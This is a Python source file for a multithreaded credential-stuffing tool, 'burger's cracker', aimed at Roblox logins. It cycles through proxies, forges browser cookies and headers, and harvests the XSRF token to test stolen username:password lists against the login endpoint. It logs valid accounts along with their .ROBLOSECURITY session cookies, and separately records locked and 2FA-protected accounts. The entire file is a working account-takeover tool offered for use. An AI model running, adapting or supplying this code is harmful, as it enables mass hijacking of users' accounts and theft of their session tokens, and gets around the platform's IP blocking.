## burger's cracker (non-solving)
## h0nda
## Created: 2020-09-02
## Last updated: 2020-09-02


from http.client import HTTPSConnection
from urllib.parse import urlparse
from datetime import datetime, timedelta
from io import BytesIO
import gzip
import json
import string
import random
import secrets
import time
import threading
import sys
import os
import itertools
import ctypes
import yaml


## define globals
combos = []
proxies = []
combo_lock = threading.Lock()
check_counter = None
checked_count = 0
total_count = 0
hit_count = 0
locked_count = 0
tfa_count = 0

## load config into memory
with open("config.yaml", encoding="UTF-8", errors="ignore") as f:
    config = yaml.safe_load(f)
    thread_count = config["threads"]
    user_agent = config["user_agent"]
    browserid_range = config["browserid_range"]
    proxy_timeout = config["proxy_timeout"]
    advanced_request_emulation = config["advanced_request_emulation"]
    del config


## define exceptions
class NoCombosLeft(Exception): pass
class RequestError(Exception): pass
class InvalidXsrfToken(Exception): pass
class InvalidCredentials(Exception): pass
class AccountLocked(Exception): pass
class InaccessibleAccount(Exception): pass
class CaptchaRequired(Exception): pass
class TwoStepVerification(Exception): pass
class BlockedIP(Exception): pass
error_code_assoc = {
    "default": Exception,
    0: InvalidXsrfToken,
    1: InvalidCredentials,
    2: CaptchaRequired,
    4: AccountLocked,
    6: InaccessibleAccount,
    10: InaccessibleAccount,
    12: InaccessibleAccount,
    14: InaccessibleAccount,
    5: InaccessibleAccount,
    403: BlockedIP
}


## class for counting cpm
class IntervalCounter:
    def __init__(self, interval=60):
        self.interval = interval
        self._list = list()
    
    def add(self):
        self._list.append(time.time())
    
    def get_cpm(self):
        self._list = list(filter(
            lambda x: (time.time()-x)<=60,
            self._list
        ))
        cpm = len(self._list)
        return cpm


## class for combos
class Combo:
    username: str
    password: str
    cookie: str

    def __init__(self, username, password):
        self.username = username
        self.password = password
        self.cookie = None
    
    def __hash__(self):
        return hash((self.username.lower(), self.password))

    def __eq__(self, c2):
        return hash(self) == hash(c2)


## class for proxies
class Proxy:
    type: str
    host: str
    port: int
    username: str
    password: str
    xsrf_token: str
    browser_id: int
    guest_id: int
    timg: str
    first_visit_date: str

    def __init__(self, proxy, type="http"):
        u = urlparse((f"{type}://" if not "://" in proxy else "") \
            + proxy)
        self.type = u.scheme
        self.host = u.hostname
        self.port = u.port
        self.username = u.username
        self.password = u.password

        self.is_setup = False
        self.xsrf_token = None
        self.timg = secrets.token_hex(random.randint(80,91)).upper()
        self.guest_id = random.randint(-2344455234, 23423423423)
        self.browser_id = random.randint(1349434,1100043000)
        self.first_visit_date = (datetime.utcnow() \
            -timedelta(hours=random.randint(5, 24*3),
                       minutes=random.randint(1, 60),
                       seconds=random.randint(1, 60))) \
            .strftime(r"%#m/%#d/%Y %#I:%M:%S %p")

    def __hash__(self):
        return hash((self.host.lower(), self.port, self.username, self.password))

    def __eq__(self, p2):
        return hash(self) == hash(p2)
    
    def get_conn(self, host="auth.roblox.com"):
        c = HTTPSConnection(self.host, self.port, timeout=proxy_timeout)
        c.set_tunnel(host, 443)
        return c
        
    def setup(self):
        ## /
        conn = self.get_conn("www.roblox.com")
        conn.putrequest("GET", "/", skip_host=True, skip_accept_encoding=True)
        conn.putheader("Host", "www.roblox.com")
        conn.putheader("Connection", "keep-alive")
        conn.putheader("Upgrade-Insecure-Requests", "1")
        conn.putheader("User-Agent", user_agent)
        conn.putheader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
        conn.putheader("Sec-Fetch-Site", "none")
        conn.putheader("Sec-Fetch-Mode", "navigate")
        conn.putheader("Sec-Fetch-User", "?1")
        conn.putheader("Sec-Fetch-Dest", "document")
        conn.putheader("Accept-Encoding", "gzip, deflate, br")
        conn.putheader("Accept-Language", "en-US,en;q=0.9")
        conn.endheaders()
        resp = conn.getresponse()
        resp.read()
        for k, v in resp.headers.items():
            if k != "set-cookie": continue
            if v.startswith("RBXImageCache"):
                self.timg = v.split("timg=")[1].split(";")[0]
            elif v.startswith("RBXViralAcquisition"):
                self.first_visit_date = v.split("time=")[1].split("&")[0]
            elif v.startswith("GuestData"):
                self.guest_id = v.split("UserID=")[1].split(";")[0]
            elif v.startswith("RBXEventTrackerV2"):
                self.browser_id = v.split("browserid=")[1].split(";")[0]

        ## /timg/rbx
        conn.putrequest("GET", "/timg/rbx", skip_accept_encoding=True, skip_host=True)
        conn.putheader("Host", "www.roblox.com")
        conn.putheader("Connection", "keep-alive")
        conn.putheader("User-Agent", user_agent)
        conn.putheader("Accept", "image/webp,image/apng,image/*,*/*;q=0.8")
        conn.putheader("Sec-Fetch-Site", "same-origin")
        conn.putheader("Sec-Fetch-Mode", "no-cors")
        conn.putheader("Sec-Fetch-Dest", "image")
        conn.putheader("Referer", "https://www.roblox.com/")
        conn.putheader("Accept-Encoding", "gzip, deflate, br")
        conn.putheader("Accept-Language", "en-US,en;q=0.9")
        conn.putheader("Cookie", self.cookie_string())
        conn.endheaders()
        resp = conn.getresponse()
        resp.read()
        for k, v in resp.headers.items():
            if k != "set-cookie": continue
            if v.startswith("RBXImageCache"):
                self.timg = v.split("timg=")[1].split(";")[0]
            elif v.startswith("RBXViralAcquisition"):
                self.first_visit_date = v.split("time=")[1].split("&")[0]
            elif v.startswith("GuestData"):
                self.guest_id = v.split("UserID=")[1].split(";")[0]
            elif v.startswith("RBXEventTrackerV2"):
                self.browser_id = v.split("browserid=")[1].split(";")[0]

        ## /login
        conn = self.get_conn("www.roblox.com")
        conn.putrequest("GET", "/login", skip_host=True, skip_accept_encoding=True)
        conn.putheader("Host", "www.roblox.com")
        conn.putheader("Connection", "keep-alive")
        conn.putheader("Upgrade-Insecure-Requests", "1")
        conn.putheader("User-Agent", user_agent)
        conn.putheader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
        conn.putheader("Sec-Fetch-Site", "same-origin")
        conn.putheader("Sec-Fetch-Mode", "navigate")
        conn.putheader("Sec-Fetch-User", "?1")
        conn.putheader("Sec-Fetch-Dest", "document")
        conn.putheader("Referer", "https://www.roblox.com/")
        conn.putheader("Accept-Encoding", "gzip, deflate, br")
        conn.putheader("Accept-Language", "en-US,en;q=0.9")
        conn.putheader("Cookie", self.cookie_string())
        conn.endheaders()
        resp = conn.getresponse()
        data = resp.read()
        if "content-encoding" in resp.headers:
            data = gzip.decompress(data).decode("UTF-8")
        self.xsrf_token = data.split("Roblox.XsrfToken.setToken('")[1].split("')")[0]

        conn.close()
        self.is_setup = True

    def cookie_string(self):
        s = f"RBXViralAcquisition=time={self.first_visit_date}&referrer=&originatingsite=; rbx-ip2=; RBXSource=rbx_acquisition_time={self.first_visit_date}&rbx_acquisition_referrer=&rbx_medium=Direct&rbx_source=&rbx_campaign=&rbx_adgroup=&rbx_keyword=&rbx_matchtype=&rbx_send_info=1; RBXEventTrackerV2=CreateDate={self.first_visit_date}&rbxid=&browserid={self.browser_id}; GuestData=UserID={self.guest_id}"
        if self.timg:
            s += f"; RBXImageCache=timg={self.timg}"
        return s


## thread for checking combos
class CheckWorker(threading.Thread):
    proxy: Proxy
    conn: HTTPSConnection

    def __init__(self):
        self.conn = None
        super().__init__()
    
    def refresh_proxy(self):
        while 1:
            try:
                if self.conn:
                    self.conn.close()
                self.proxy = next(proxies)
                if not self.proxy.is_setup and advanced_request_emulation:
                    self.proxy.setup()
                self.conn = self.proxy.get_conn()
                break
            except Exception as err:
                pass
    
    def run(self):
        global checked_count
        global hit_count, locked_count, tfa_count
        
        self.refresh_proxy()
        while 1:
            try:
                combo = get_combo()
            except NoCombosLeft:
                return

            try:
                user, cookie = check_login(combo, self.proxy, self.conn)
                combo.username = user["name"]
                combo.cookie = cookie
                hit_count += 1
                checked_count += 1
                check_counter.add()
                print("Hit: %s" % combo.username)
                write_log("combos", "%s:%s" % (combo.username, combo.password))
                write_log("cookies", "%s" % (combo.cookie))
                write_log("combos_cookies", "%s:%s:%s" % (combo.username, combo.password, combo.cookie.replace("WARNING:", "WARNING")))

            except TwoStepVerification:
                tfa_count += 1
                checked_count += 1
                check_counter.add()
                print("2FA: %s" % combo.username)
                write_log("2fa", "%s:%s" % (combo.username, combo.password))

            except AccountLocked:
                locked_count += 1
                checked_count += 1
                check_counter.add()
                print("Locked: %s" % combo.username)
                write_log("locked", "%s:%s" % (combo.username, combo.password))
            
            except InvalidCredentials:
                checked_count += 1
                check_counter.add()
                print("Invalid: %s:%s" % (combo.username, combo.password))
            
            except InaccessibleAccount:
                checked_count += 1
                check_counter.add()

            except (InvalidXsrfToken, CaptchaRequired, RequestError, \
                BlockedIP, json.JSONDecodeError):
                self.refresh_proxy()
                put_combo(combo)

            except Exception as err:
                print("Check-Worker error:", type(err), err)
                put_combo(combo)


## thread for updating window title
class TitleWorker(threading.Thread):
    def __init__(self, interval=0.1):
        self.interval = interval
        super().__init__()
    
    def run(self):
        while total_count > checked_count:
            time.sleep(self.interval)
            ctypes.windll.kernel32.SetConsoleTitleW("  |  ".join([
                "burger's cracker (non-solving)",
                "CPM: %d" % check_counter.get_cpm(),
                "Progress: %d/%d (%.2f%%)" % (checked_count, total_count, checked_count/total_count*100),
                "Hits/Locked/2FA: %d/%d/%d" % (hit_count, locked_count, tfa_count)
            ]))


## response error handling
def raise_on_error(resp):
    if "twoStepVerificationData" in resp:
        raise TwoStepVerification
    if not "errors" in resp: return
    for err in resp["errors"]:
        raise error_code_assoc.get(err["code"], error_code_assoc["default"]) \
            ("%s (%d)" % (err["message"], err["code"]))

## check roblox login
def check_login(combo: Combo, proxy: Proxy, c: HTTPSConnection = None):
    payload = json.dumps(dict(ctype="Username", \
        cvalue=combo.username, password=combo.password),
        separators=(",", ":"))
    c = c or proxy.get_conn()

    def send_request():
        try:
            c.putrequest("POST", "/v2/login", skip_host=True, skip_accept_encoding=True)
            c.putheader("Host", "auth.roblox.com")
            c.putheader("Connection", "keep-alive")
            c.putheader("Content-Length", len(payload))
            c.putheader("Accept", "application/json, text/plain, */*")
            if proxy.xsrf_token:
                c.putheader("X-CSRF-TOKEN", proxy.xsrf_token)
            c.putheader("User-Agent", user_agent)
            c.putheader("Content-Type", "application/json;charset=UTF-8")
            c.putheader("Origin", "https://www.roblox.com")
            c.putheader("Sec-Fetch-Site", "same-site")
            c.putheader("Sec-Fetch-Mode", "cors")
            c.putheader("Sec-Fetch-Dest", "empty")
            c.putheader("Referer", "https://www.roblox.com/login")
            c.putheader("Accept-Encoding", "gzip, deflate, br")
            c.putheader("Accept-Language", "en-US,en;q=0.9")
            c.putheader("Cookie", proxy.cookie_string())
            c.endheaders()
            c.send(payload.encode("UTF-8"))
            resp = c.getresponse()
            data = resp.read()
            if "content-encoding" in resp.headers:
                data = gzip.decompress(data)
        except Exception:
            raise RequestError
        data = json.loads(data)
        return resp, data

    resp, data = send_request()
    
    if "x-csrf-token" in resp.headers:
        proxy.xsrf_token = resp.headers["x-csrf-token"]
        resp, data = send_request()
    
    raise_on_error(data)
    return data["user"], [x.split(".ROBLOSECURITY=")[1].split(";")[0] for x in resp.headers.values() if ".ROBLOSECURITY" in x][0]


## combo handling
def get_combo():
    with combo_lock:
        if not combos:
            raise NoCombosLeft
        combo = combos.pop()
        return combo

def put_combo(combo):
    combos.append(combo)

def write_log(category, log):
    with open(os.path.join("logs", "%s.txt"%category), "a", encoding="UTF-8", \
        errors="ignore") as f:
        f.write("%s\n" % log)
        f.flush()


## create output dir
if not os.path.exists("./logs"):
    os.mkdir("./logs")


## load combos into memory
print("Loading combos ..")
with open("combos.txt" if len(sys.argv)<2 else sys.argv[1], errors="ignore", encoding="UTF-8") as f:
    for line in f.read().splitlines():
        v = line.split(":")
        if len(v) < 2: continue
        if len(v[0]) < 2 or len(v[0]) > 50: continue
        if "@" in v[0]: continue
        c = Combo(v[0], v[1])
        combos.append(c)
    combos = list(set(combos))
    total_count = len(combos)
    print("%d unique combos loaded" % total_count)


## load proxies into memory
print("Loading proxies ..")
with open("proxies.txt", errors="ignore", encoding="UTF-8") as f:
    for line in f.read().splitlines():
        if not line.strip(): continue
        p = Proxy(line)
        proxies.append(p)
    proxies = list(set(proxies))
    print("%d unique proxies loaded" % len(proxies))
    proxies = itertools.cycle(proxies)


## cpm counter
check_counter = IntervalCounter()

## start check-threads
print("Starting threads ..")
TitleWorker().start()
ct = [CheckWorker() for _ in range(thread_count)]
for t in ct: t.start()
print("All threads are now running!")

## wait for finish
for t in ct: t.join()
print("Completed! %d/%d combos checked" % (checked_count, total_count))